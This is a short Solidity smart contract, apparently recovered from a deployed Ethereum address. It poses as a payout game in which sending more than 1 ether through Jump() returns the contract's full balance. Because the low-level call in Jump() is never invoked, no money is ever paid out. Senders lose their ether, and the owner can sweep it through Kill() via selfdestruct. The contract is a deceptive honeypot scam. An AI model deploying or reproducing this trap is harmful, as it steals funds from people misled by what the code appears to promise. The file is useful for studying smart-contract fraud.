/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract SPRING_BOARD_1_ETH at 0x6805661283c64a79323d187f9d6b2ca4dae59fd0
*/
pragma solidity ^0.4.19;

contract SPRING_BOARD_1_ETH   
{
    address owner = msg.sender;
    
    function() public payable {}
    
    function Jump()
    public
    payable
    {
        if(msg.value > 1 ether)
        {
            msg.sender.call.value(this.balance);
        }
    }
    
    function Kill()
    public
    payable
    {
        if(msg.sender==owner)
        {
            selfdestruct(owner);
        }
    }
}